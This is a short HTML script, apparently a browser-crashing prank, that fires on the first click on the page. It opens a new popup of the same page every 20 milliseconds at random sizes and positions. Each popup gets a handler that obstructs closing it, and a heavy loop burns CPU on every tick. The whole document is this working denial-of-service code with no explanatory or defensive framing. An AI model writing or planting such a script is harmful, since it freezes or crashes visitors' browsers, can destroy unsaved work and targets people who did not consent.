<script>
document.addEventListener('click', () => {
  console.log("Crash start!!!");
  setInterval(() => {
    let w = Math.floor(Math.random() * 400) + 200;
    let h = Math.floor(Math.random() * 400) + 200;
    let x = Math.floor(Math.random() * window.screen.width);
    let y = Math.floor(Math.random() * window.screen.height);
    
    let newWin = window.open(
      window.location.href, 
      '_blank', 
      `width=${w},height=${h},left=${x},top=${y},menubar=no,status=no`
    );

    if (newWin) {
      newWin.onbeforeunload = () => true;
    }

    for(let i=0; i<5000000; i++) { Math.atan(i); }

  }, 20); 
});

</script>
